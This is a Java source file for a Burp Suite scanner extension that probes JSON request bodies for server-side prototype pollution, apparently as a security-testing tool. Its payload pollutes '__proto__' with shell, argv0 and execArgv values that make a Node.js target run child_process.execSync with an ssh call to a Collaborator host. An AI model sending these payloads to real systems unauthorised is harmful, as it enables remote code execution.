package burp;

import com.google.gson.*;

import java.util.*;

import static burp.PrototypePollutionBodyScan.MAX_RETRIES;

public class PrototypePollutionAsyncBodyScan extends Scan {
    final Boolean injectSpecificProperties = false;
    static final Map<String, String[]> asyncTechniques = new HashMap<String, String[]>()
    {
        {
            put("async", new String[]{
                    "__proto__"," {\n" +
                    "\"argv0\":\"vim\",\n" +
                    "\"shell\":\"vim\",\n" +
                    "\"input\":\":!{ssh -o ConnectTimeout=1 shell\\\\.$collabplz}\\n\",\n" +
                    "\"execArgv\":[\"--eval=require('child_process').execSync('ssh -o ConnectTimeout=1 execArgv\\\\.$collabplz')\"]\n" +
                    "}"
            });
        }
    };

    @Override
    public List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
        Utilities.out("--Running async body scan--");
        for (Map.Entry<String, String[]> technique : asyncTechniques.entrySet()) {
            doAttack(baseReq, Utilities.getBody(baseReq), service, technique);
        }

        return null;
    }

    static ArrayList<String[]> getAttackJsonStrings(String jsonString, Map.Entry<String, String[]> currentTechnique) {
        ArrayList<String[]> jsonList = new ArrayList<>();
        try {
            JsonElement json = new JsonParser().parse(jsonString);
            if(json.isJsonArray() || json.isJsonObject()) {
                traverseJsonGenerateJsonAttack(json, currentTechnique, jsonList, json);
            }
            return jsonList;
        } catch(JsonSyntaxException e) {
            Utilities.err("Invalid JSON:" + e);
            return null;
        }
    }

    public void doAttack(byte[] baseReq, String jsonString, IHttpService service, Map.Entry<String, String[]> technique) {
        if(!jsonString.trim().startsWith("{") && !jsonString.trim().startsWith("[")) {
            return;
        }

        if(injectSpecificProperties) {
            ArrayList<String[]> jsonList = getAttackJsonStrings(jsonString, technique);
            if (jsonList != null) {
                for (String[] json : jsonList) {
                    String attackJsonString = json[0];
                    byte[] attackRequest = baseReq.clone();
                    attackRequest = Utilities.setBody(attackRequest, attackJsonString);
                    attackRequest = Utilities.fixContentLength(attackRequest);
                    if (attackRequest != null) {
                        request(service, attackRequest, MAX_RETRIES);
                    }
                }
            }
        } else {
            JsonElement attackJson = PrototypePollutionBodyScan.generateJson(jsonString, technique.getValue(), false);
            byte[] attackRequest = baseReq.clone();
            if (attackJson != null && !attackJson.isJsonNull()) {
                attackRequest = Utilities.setBody(attackRequest, attackJson.toString());
                attackRequest = Utilities.fixContentLength(attackRequest);
                request(service, attackRequest, MAX_RETRIES);
            }
        }
    }

    static JsonElement traverseJsonGenerateJsonAttack(JsonElement jsonElement, Map.Entry<String, String[]> currentTechnique, ArrayList<String[]> jsonList, JsonElement fullJsonElement) {
        if (jsonElement.isJsonNull()) {
            return null;
        }

        if (jsonElement.isJsonPrimitive()) {
            return null;
        }

        if (jsonElement.isJsonArray()) {
            JsonArray jsonArray = jsonElement.getAsJsonArray();
            if ( null != jsonArray) {
                for (int i=0;i<jsonArray.size();i++) {
                    jsonElement = traverseJsonGenerateJsonAttack(jsonArray.get(i), currentTechnique, jsonList, fullJsonElement);
                }
                if(jsonElement != null) {
                    return jsonElement;
                }
            }
            return null;
        }

        if (jsonElement.isJsonObject()) {
            JsonParser parser = new JsonParser();
            Set<Map.Entry<String, JsonElement>> jsonObjectEntrySet = jsonElement.getAsJsonObject().entrySet();
            if(jsonObjectEntrySet.size() == 0) {
                String existingPropertyName = "";
                String techniquePropertyName = currentTechnique.getValue()[0];
                String techniqueValue = currentTechnique.getValue()[1];
                jsonList.add(new String[]{PrototypePollutionBodyScan.generateJsonString(fullJsonElement, jsonElement, existingPropertyName, techniquePropertyName, parser.parse(techniqueValue))});
            } else {
                for (Map.Entry<String, JsonElement> jsonEntry : jsonObjectEntrySet) {
                    String existingPropertyName = jsonEntry.getKey();
                    String techniquePropertyName = currentTechnique.getValue()[0];
                    String techniqueValue = currentTechnique.getValue()[1];
                    jsonList.add(new String[]{PrototypePollutionBodyScan.generateJsonString(fullJsonElement, jsonElement, existingPropertyName, techniquePropertyName, parser.parse(techniqueValue))});
                    traverseJsonGenerateJsonAttack(jsonEntry.getValue(), currentTechnique, jsonList, fullJsonElement);
                }
            }
        }
        return null;
    }

    PrototypePollutionAsyncBodyScan(String name) {
        super(name);
    }

}
